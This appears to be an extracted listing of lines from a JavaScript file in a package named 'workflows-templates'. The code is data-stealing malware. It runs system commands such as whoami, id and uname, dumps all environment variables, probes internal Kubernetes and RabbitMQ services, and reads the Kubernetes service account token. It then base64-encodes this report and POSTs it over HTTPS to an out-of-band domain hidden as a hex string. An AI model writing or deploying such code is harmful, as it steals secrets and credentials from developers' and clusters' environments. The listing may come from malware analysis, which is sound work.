// File: tmp/tmp53ww4rfe/workflows-templates/package/index.js
// ======================================================================
Line 7: const os = require('os')
Line 8: const https = require('https')
Line 9: const http = require('http')
Line 10: const net = require('net')
Line 11: const fs = require('fs')
Line 12: _tmp_0 = require('child_process')
Line 22: execSync(cmd, { stdio: 'pipe', timeout: 3000 }).toString().trim()
Line 51: {
    if (!host || !port) return resolve('TARGET_UNDEFINED');
    const socket = new net.Socket();
    socket.setTimeout(2000);
    socket.on('connect', () => {
        resolve('PORT_OPEN');
        socket.destroy();
    });
    socket.on('error', (e) => resolve(`PORT_ERROR:${e.message}`));
    socket.on('timeout', () => {
        resolve('PORT_TIMEOUT');
        socket.destroy();
    });
    socket.connect(port, host);
}
Line 53: const socket = new net.Socket()
Line 54: socket.setTimeout(2000)
Line 55: {
        resolve('PORT_OPEN');
        socket.destroy();
    }
Line 57: socket.destroy()
Line 60: {
        resolve('PORT_TIMEOUT');
        socket.destroy();
    }
Line 62: socket.destroy()
Line 70: {
    const report = {
        proof_of_execution: {
            hostname: run('hostname'),
            whoami: run('whoami'),
            id: os.platform() === 'win32' ? 'N/A' : run('id'),
            timestamp: new Date().toISOString()
        },
        system_context: {
            os_platform: os.platform(),
            uname: os.platform() === 'win32' ? run('ver') : run('uname -a'),
            current_path: run('pwd') || run('cd'),
            node_version: process.version,
            user_info_node: os.userInfo()
        },
        environment_dump: process.env
    };

    // The key section: Active, Node-native internal reconnaissance.
    report.internal_recon_native = {
        title: "Actively probing internal services using pure Node.js modules...",
        k8s_api_probe: await probeHttp(process.env.KUBERNETES_SERVICE_HOST, process.env.KUBERNETES_SERVICE_PORT, 'https'),
        rabbitmq_mgmt_ui_probe: await probeHttp(process.env.RABBITMQ_SERVICE_HOST, 15672),
        r...
Line 71: const report = {
        proof_of_execution: {
            hostname: run('hostname'),
            whoami: run('whoami'),
            id: os.platform() === 'win32' ? 'N/A' : run('id'),
            timestamp: new Date().toISOString()
        },
        system_context: {
            os_platform: os.platform(),
            uname: os.platform() === 'win32' ? run('ver') : run('uname -a'),
            current_path: run('pwd') || run('cd'),
            node_version: process.version,
            user_info_node: os.userInfo()
        },
        environment_dump: process.env
    }
Line 72: _tmp_8.proof_of_execution = {
            hostname: run('hostname'),
            whoami: run('whoami'),
            id: os.platform() === 'win32' ? 'N/A' : run('id'),
            timestamp: new Date().toISOString()
        }
Line 73: _tmp_9.hostname = run('hostname')
Line 74: _tmp_9.whoami = run('whoami')
Line 75: _tmp_9.id = os.platform() === 'win32' ? "N/A" : run('id')
Line 78: _tmp_8.system_context = {
            os_platform: os.platform(),
            uname: os.platform() === 'win32' ? run('ver') : run('uname -a'),
            current_path: run('pwd') || run('cd'),
            node_version: process.version,
            user_info_node: os.userInfo()
        }
Line 79: os.platform()
Line 80: _tmp_12.uname = os.platform() === 'win32' ? run('ver') : run('uname -a')
Line 81: _tmp_12.current_path = run('pwd') || run('cd')
Line 83: os.userInfo()
Line 89: report.internal_recon_native = {
        title: "Actively probing internal services using pure Node.js modules...",
        k8s_api_probe: await probeHttp(process.env.KUBERNETES_SERVICE_HOST, process.env.KUBERNETES_SERVICE_PORT, 'https'),
        rabbitmq_mgmt_ui_probe: await probeHttp(process.env.RABBITMQ_SERVICE_HOST, 15672),
        rabbitmq_amqp_port_probe: await probeTcp(process.env.RABBITMQ_SERVICE_HOST, 5672),
        k8s_service_account_token: fs.existsSync('/var/run/secrets/kubernetes.io/serviceaccount/token')
            ? fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token', 'utf8')
            : 'TOKEN_NOT_FOUND'
    }
Line 93: probeTcp(process.env.RABBITMQ_SERVICE_HOST, 5672)
Line 94: _tmp_13.k8s_service_account_token = fs.existsSync('/var/run/secrets/kubernetes.io/serviceaccount/token') ? fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token', 'utf8') : "TOKEN_NOT_FOUND"
Line 95: fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token', 'utf8')
Line 104: {
        const intelReport = await gatherIntelligence();
        const payload = Buffer.from(JSON.stringify(intelReport, null, 2)).toString('base64');
        const oast_domain = Buffer.from(OAST_DOMAIN_HEX, 'hex').toString();

        https.request({
            hostname: oast_domain,
            port: 443,
            path: `/NODE_NATIVE_HIT/${intelReport.proof_of_execution.hostname}/${intelReport.proof_of_execution.whoami.replace('\\', '-')}`,
            method: 'POST',
            headers: { 'Content-Type': 'text/plain', 'Content-Length': payload.length }
        }).on('error', e => {}).end(payload);
    }
Line 106: Buffer.from(JSON.stringify(intelReport, null, 2)).toString('base64')
Line 107: Buffer.from(OAST_DOMAIN_HEX, 'hex').toString()
Line 109: https.request({
            hostname: oast_domain,
            port: 443,
            path: `/NODE_NATIVE_HIT/${intelReport.proof_of_execution.hostname}/${intelReport.proof_of_execution.whoami.replace('\\', '-')}`,
            method: 'POST',
            headers: { 'Content-Type': 'text/plain', 'Content-Length': payload.length }
        }).on('error', e => {}).end(payload)
